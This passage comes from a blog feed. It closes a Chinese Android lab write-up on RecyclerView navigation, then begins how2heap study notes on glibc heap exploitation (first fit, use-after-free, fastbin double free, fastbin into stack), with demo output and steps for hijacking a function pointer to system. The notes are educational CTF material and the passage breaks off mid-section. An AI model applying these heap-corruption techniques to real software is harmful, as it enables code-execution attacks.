java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.graphics.Color;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.LinearLayout;<br><br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResult;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultCallback;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultLauncher;<br><span class="hljs-keyword">import</span> androidx.activity.result.contract.ActivityResultContracts;<br><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.ItemTouchHelper;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.LinearLayoutManager;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Collections;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">txlFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fragment</span> {<br>    <span class="hljs-comment">//获取recyclerView对象并且实例化适配器</span><br>    <span class="hljs-keyword">private</span> RecyclerView recyclerView;<br>    <span class="hljs-keyword">private</span> MyAdapter myAdapter;<br>    LinearLayout linearLayout;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span><br><span class="hljs-params">                             Bundle savedInstanceState)</span> {<br>        <span class="hljs-comment">// Inflate the layout for this fragment</span><br>        <span class="hljs-comment">//return inflater.inflate(R.layout.fra_lx, container, false);</span><br>        View view;<br>        <span class="hljs-comment">//存所有控件的视图</span><br>        view=inflater.inflate(R.layout.item, container, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//调用recycleview控件</span><br>        recyclerView=view.findViewById(R.id.itemview);<br>        linearLayout=view.findViewById(R.id.linearLayout_txl);<br>        <span class="hljs-comment">//创建数据</span><br>        String[] names={<span class="hljs-string">"Pappy"</span>,<span class="hljs-string">"Mommy"</span>,<span class="hljs-string">"Sister"</span>,<span class="hljs-string">"Little Sister"</span>,<span class="hljs-string">"Brother"</span>,<span class="hljs-string">"Little Brother"</span>,<span class="hljs-string">"Roommate"</span>};<br>        <span class="hljs-type">int</span>[] images={R.drawable.baba,R.drawable.mama,R.drawable.jiejie,R.drawable.meimei,R.drawable.gege,<br>                R.drawable.didi,R.drawable.shiyou1};<br>        String[] phones={<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>,<br>                <span class="hljs-string">"123456789"</span>,<span class="hljs-string">"123456789"</span>};<br>        String[] regions={<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"四川 南充"</span>,<span class="hljs-string">"湖北 武汉"</span>};<br>        String[] tags={<span class="hljs-string">"家人"</span>,<span class="hljs-string">"家人"</span>,<span class="hljs-string">"家人"</span>,<span class="hljs-string">"家人"</span>,<span class="hljs-string">"家人"</span>,<span class="hljs-string">"家人"</span>,<span class="hljs-string">"同学"</span>};<br>        List&lt;Map&lt;String,Object&gt;&gt; items=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Map&lt;String,Object&gt;&gt;();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;names.length;i++){<br>            Map&lt;String,Object&gt; item=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>            item.put(<span class="hljs-string">"i_name"</span>,names[i]);<br>            item.put(<span class="hljs-string">"i_image"</span>,images[i]);<br>            item.put(<span class="hljs-string">"i_phone"</span>,phones[i]);<br>            item.put(<span class="hljs-string">"i_region"</span>,regions[i]);<br>            item.put(<span class="hljs-string">"i_tag"</span>,tags[i]);<br>            items.add(item);<br>        }<br>        <span class="hljs-comment">//创建RecycleView实例和设置Adapter</span><br>        Context context=getContext();<br>        myAdapter=<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAdapter</span>(items,context);<br>        LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br>        manager.setOrientation(recyclerView.VERTICAL);<br>        recyclerView.setLayoutManager(manager);<br>        recyclerView.setAdapter(myAdapter);<br>        <span class="hljs-keyword">return</span> view;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="2-2-Myadapater-实现跳转操作"><a href="#2-2-Myadapater-实现跳转操作" class="headerlink" title="2.2 Myadapater 实现跳转操作"></a>2.2 Myadapater 实现跳转操作</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.ImageView;<br><span class="hljs-keyword">import</span> android.widget.LinearLayout;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResult;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultCallback;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultLauncher;<br><span class="hljs-keyword">import</span> androidx.activity.result.contract.ActivityResultContracts;<br><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RecyclerView</span>.Adapter &lt;MyAdapter.MyViewHolder&gt;{<br>    <span class="hljs-comment">//定义存储数据和运行环境的变量</span><br>    <span class="hljs-keyword">private</span> List&lt;Map&lt;String,Object&gt;&gt; mydata;<br>    <span class="hljs-keyword">private</span> Context mycontext;<br><br>    <span class="hljs-comment">//获取数据和运行环境</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAdapter</span><span class="hljs-params">(List&lt;Map&lt;String,Object&gt;&gt; data, Context context)</span>{<br>        mydata=data;<br>        mycontext=context;<br>    }<br><br>    <span class="hljs-meta">@NonNull</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> MyViewHolder <span class="hljs-title function_">onCreateViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> ViewGroup parent, <span class="hljs-type">int</span> viewType)</span> {<br>        View view= LayoutInflater.from(mycontext).inflate(R.layout.fragment_txl,parent,<span class="hljs-literal">false</span>);<br>        MyViewHolder holder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyViewHolder</span>(view);<br>        <span class="hljs-keyword">return</span> holder;<br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> MyAdapter.MyViewHolder holder, <span class="hljs-type">int</span> position)</span> {<br>        String name=mydata.get(position).get(<span class="hljs-string">"i_name"</span>).toString();<br>        <span class="hljs-type">int</span> image=Integer.parseInt(mydata.get(position).get(<span class="hljs-string">"i_image"</span>).toString());<br>        <span class="hljs-comment">//获取详情页面中某个联系人的对应数据</span><br>        String phone=mydata.get(position).get(<span class="hljs-string">"i_phone"</span>).toString();<br>        String region=mydata.get(position).get(<span class="hljs-string">"i_region"</span>).toString();<br>        String tag=mydata.get(position).get(<span class="hljs-string">"i_tag"</span>).toString();<br>        holder.textView.setText(name);<br>        holder.imageView.setImageResource(image);<br><br>        <span class="hljs-comment">//添加点击事件</span><br>        holder.linearLayout_txl.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() {<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> {<br>                <span class="hljs-comment">//点击后跳转到联系人详情页</span><br>                Intent intent=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(mycontext, txlDetails.class);<br><br>                <span class="hljs-comment">//使用bundle传值</span><br>                <span class="hljs-type">Bundle</span> <span class="hljs-variable">bundle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bundle</span>();<br>                bundle.putString(<span class="hljs-string">"details"</span>,name);<br>                bundle.putInt(<span class="hljs-string">"image"</span>, image);<br>                bundle.putString(<span class="hljs-string">"phone"</span>,phone);<br>                bundle.putString(<span class="hljs-string">"region"</span>,region);<br>                bundle.putString(<span class="hljs-string">"tag"</span>,tag);<br><br>                intent.putExtras(bundle);<br>                mycontext.startActivity(intent);<br>            }<br>        });<br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getItemCount</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">return</span> mydata.size();<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewHolder</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RecyclerView</span>.ViewHolder {<br>        <span class="hljs-keyword">public</span> LinearLayout linearLayout_txl;<br>        <span class="hljs-keyword">private</span> TextView textView;<br>        <span class="hljs-keyword">private</span> ImageView imageView;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> View itemView)</span> {<br>            <span class="hljs-built_in">super</span>(itemView);<br>            <span class="hljs-comment">//获取item中的控件id</span><br>            textView=itemView.findViewById(R.id.text_duihuakuang);<br>            imageView=itemView.findViewById(R.id.image_touxiang);<br>            linearLayout_txl=itemView.findViewById(R.id.linearLayout_txl);<br>        }<br><br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>跳转的实现主要是对于LinearLayout_txl 的点击动作实现一个监听，具体操作 Intent intent=new Intent(mycontext, txlDetails.class) <code>myContext</code>是一个代表当前Activity的上下文对象。<code>txlDetails.class</code>是目标Activity的类名。然后将数据压缩绑定到bundle里面，添加到intent，最后调用startActivity(intent) 进行跳转</p><h4 id="2-3-txlDetails"><a href="#2-3-txlDetails" class="headerlink" title="2.3 txlDetails"></a>2.3 txlDetails</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.ImageView;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">txlDetails</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> {<br>    TextView dName,textView1,textView2,textView3;<br>    ImageView dImage;<br>    Button button_r;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_txl_details);<br>        <span class="hljs-comment">//获取上一个Actvity传过来的intent</span><br>        Intent intent=getIntent();<br>        dName=findViewById(R.id.textDetail);<br>        dImage=findViewById((R.id.imageDetail));<br>        <span class="hljs-comment">//根据intent获取得到的数据设置item控件的值</span><br>        dImage.setImageResource(intent.getIntExtra(<span class="hljs-string">"image"</span>,R.drawable.find));<br>        dName.setText(intent.getStringExtra(<span class="hljs-string">"details"</span>));<br>        textView1=findViewById(R.id.phone);<br>        textView2=findViewById(R.id.region2);<br>        textView3=findViewById(R.id.wxtag2);<br>        textView1.setText(intent.getStringExtra(<span class="hljs-string">"phone"</span>));<br>        textView2.setText(intent.getStringExtra(<span class="hljs-string">"region"</span>));<br>        textView3.setText(intent.getStringExtra(<span class="hljs-string">"tag"</span>));<br>        button_r=findViewById(R.id.returnButton);<br>        button_r.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() {<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> {<br>                Log.d(<span class="hljs-string">"fb"</span>,<span class="hljs-string">"button_r...."</span>);<br>                <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>                setResult(<span class="hljs-number">777</span>,intent);<br>                finish();<br>            }<br>        });<br><br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>用于接受来自txlFragment传过来的数据并显示数据，设置了返回button用于返回至跳转前的Activity</p><h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p class='item-img' data-src='https://s2.loli.net/2023/11/07/CImD2GeQHcdvFsE.gif'><img src="https://s2.loli.net/2023/11/07/CImD2GeQHcdvFsE.gif" alt="4.gif"></p><h2 id="代码仓库"><a href="#代码仓库" class="headerlink" title="代码仓库"></a>代码仓库</h2><p><a href="https://github.com/Kylinxin/MyWork">https://github.com/Kylinxin/MyWork</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​本次实现我完成了RecyclerView的实现，明白了如何对recyclerView进行传参，设置每一项的具体样子。同时对Activity跳转有了更清晰的认识，startActivity(intent);通过intent设置了跳转对象，进行跳转，这种方法简单直观，但是没办法处理返回值，老版本的解决方法是采用方法startActivityForResult()进行解决，但是有许多弊端和RequestCode难以处理，新版本中采用了registerForActivityResult()方法通过在使用<code>registerForActivityResult()</code>方法注册ActivityResultContracts.StartActivityForResult时，处理启动Activity并获取返回结果的逻辑。ActivityResultCallback<activityresult>是一个接口，用于处理<code>ActivityResultLauncher</code>的结果回调。当启动的Activity结束并返回结果时，回调方法中的<code>ActivityResult</code>参数将包含返回的结果信息。总的来说思路非常清晰，但是我也发现了一个问题，那就是在myadater中无法使用这种方式进行跳转，后来查找原因，registerForActivityResult()只能在fragment或activity中才能使用。这次收获满满，加深了我对recyclerView的使用和activity间跳转的用法和差异。</activityresult></p><p>—— 2023.11.7</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AS类微信界面开发&quot;&gt;&lt;a href=&quot;#AS类微信界面开发&quot; class=&quot;headerlink&quot; title=&quot;AS类微信界面开发&quot;&gt;&lt;/a&gt;AS类微信界面开发&lt;/h1&gt;&lt;h2 id=&quot;功能要求&quot;&gt;&lt;a href=&quot;#功能要求&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="实验" scheme="https://kylinxin.github.io/categories/%E5%AE%9E%E9%AA%8C/"/>
    
    
    <category term="移动开发实验" scheme="https://kylinxin.github.io/tags/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>how2heap漏洞和解析</title>
    <link href="https://kylinxin.github.io/2023/10/31/how2heap%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%8E%9F%E7%90%86/"/>
    <id>https://kylinxin.github.io/2023/10/31/how2heap%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%8E%9F%E7%90%86/</id>
    <published>2023-10-31T15:14:29.000Z</published>
    <updated>2023-10-31T08:05:32.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="First-fit"><a href="#First-fit" class="headerlink" title="First fit"></a>First fit</h2><p><strong>原理</strong></p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs llvm">演示glibc 的分配机制<br>glibc 使用首次适应算法选择空闲的堆块<br>如果有一个空闲堆块且足够大，那么 <span class="hljs-keyword">malloc</span> 将选择它<br>如果存在 use-after-<span class="hljs-keyword">free</span> 的情况那可以利用这一特性<br>首先申请两个比较大的 chunk<br>第一个 a <span class="hljs-operator">=</span> <span class="hljs-keyword">malloc</span>(<span class="hljs-number">0x512</span>) 在: <span class="hljs-number">0x1682010</span><br>第二个 b <span class="hljs-operator">=</span> <span class="hljs-keyword">malloc</span>(<span class="hljs-number">0x256</span>) 在: <span class="hljs-number">0x1682530</span><br>我们可以继续分配它<br>现在我们把 <span class="hljs-string">"AAAAAAAA"</span> 这个字符串写到 a 那里 <br>第一次申请的 <span class="hljs-number">0x1682010</span> 指向 AAAAAAAA<br>接下来 <span class="hljs-keyword">free</span> 掉第一个...<br>接下来只要我们申请一块小于 <span class="hljs-number">0x512</span> 的 chunk，那就会分配到原本 a 那里: <span class="hljs-number">0x1682010</span><br>第三次 <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">malloc</span>(<span class="hljs-number">0x500</span>) 在: <span class="hljs-number">0x1682010</span><br>我们这次往里写一串 <span class="hljs-string">"CCCCCCCC"</span> 到刚申请的 <span class="hljs-keyword">c</span> 中<br>第三次申请的 <span class="hljs-keyword">c</span> <span class="hljs-number">0x1682010</span> 指向 CCCCCCCC<br>第一次申请的 a <span class="hljs-number">0x1682010</span> 指向 CCCCCCCC<br>可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 <span class="hljs-string">"CCCCCCCC"</span><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>存在uaf，首先释放一个堆块p1，里面有内容</li><li>再申请一个相同大小的堆块p2</li><li>这两个堆块实际上指向同一个内存区域</li></ul><p><strong>结果</strong></p><p>这两个堆块实际上指向同一个内存区域</p><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p><strong>原理</strong></p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs armasm">申请<span class="hljs-number">0x20</span>大小的内存<span class="hljs-built_in">p1</span> 的地址: <span class="hljs-number">0x1f11010</span><br>把<span class="hljs-built_in">p1</span>[<span class="hljs-number">1</span>]赋值为Printf函数，然后打印出<span class="hljs-string">"Hello CTFshow"</span><br><span class="hljs-symbol">Hello</span> CTFshow<br><br><span class="hljs-symbol">free</span> 掉 <span class="hljs-built_in">p1</span><br>因为并没有置为null，所以<span class="hljs-built_in">p1</span>[<span class="hljs-number">1</span>]仍然是Printf函数，仍然可以输出打印了<span class="hljs-string">"Hello CTFshow again"</span><br><span class="hljs-symbol">Hello</span> CTFshow again<br>接下来再去malloc一个<span class="hljs-built_in">p2</span>，会把释放掉的<span class="hljs-built_in">p1</span>给分配出来，可以看到他俩是同一地址的<br><span class="hljs-symbol">p2</span> 的地址: <span class="hljs-number">0x1f11010</span><br><span class="hljs-symbol">p1</span> 的地址: <span class="hljs-number">0x1f11010</span><br>然后把<span class="hljs-built_in">p2</span>[<span class="hljs-number">1</span>]给改成demoflag也就是system函数<br><br><span class="hljs-symbol">Then</span> <span class="hljs-meta">get</span> the flag &amp;&amp; enjoy <span class="hljs-keyword">it</span> !<br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>free掉chunk1</li><li>再申请一个相同大小的chunk2，修改内容</li><li>再使用chunk1，会输出修改内容</li></ul><p><strong>结果</strong></p><p>chunk1和chunk2是同一个chunk</p><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><p><strong>原理</strong></p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs llvm">演示 fastbin 的 <span class="hljs-keyword">double</span> <span class="hljs-keyword">free</span><br>首先申请 <span class="hljs-number">3</span> 个 chunk<br>第一个 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f010</span><br>第二个 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f030</span><br>第三个 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f050</span><br><span class="hljs-keyword">free</span> 掉第一个<br>当我们再次 <span class="hljs-keyword">free</span> <span class="hljs-number">0x188f010</span> 的时候<span class="hljs-punctuation">,</span> 程序将会崩溃因为 <span class="hljs-number">0x188f010</span> 在 <span class="hljs-keyword">free</span> 链表的第一个位置上<br>我们先 <span class="hljs-keyword">free</span> <span class="hljs-number">0x188f030</span>.<br>现在我们就可以再次 <span class="hljs-keyword">free</span> <span class="hljs-number">0x188f010</span> 了<span class="hljs-punctuation">,</span> 因为他现在不在 <span class="hljs-keyword">free</span> 链表的第一个位置上<br>现在空闲链表是这样的 [ <span class="hljs-number">0x188f010</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0x188f030</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0x188f010</span> ]. 如果我们 <span class="hljs-keyword">malloc</span> 三次<span class="hljs-punctuation">,</span> 我们会得到两次 <span class="hljs-number">0x188f010</span> <br>第一次 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f010</span><br>第二次 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f030</span><br>第三次 <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f010</span><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>申请3个chunk，p1，p2，p3</li><li>free p1，再freep2，形成 p2 -&gt; p1</li><li>再free p1 形成 p1 -&gt; p2 -&gt; p1</li><li>连续申请三次chunk</li></ul><p><strong>结果</strong></p><p>得到两个相同地址的chunk</p><h2 id="Fastbin-dup-into-stack-–-Double-free"><a href="#Fastbin-dup-into-stack-–-Double-free" class="headerlink" title="Fastbin_dup_into_stack – Double free"></a>Fastbin_dup_into_stack – Double free</h2><p><strong>原理</strong></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）<br>通过 malloc 申请到 <span class="hljs-number">0x7ffec12adb40</span>.<br>先申请<span class="hljs-number">3</span> 个 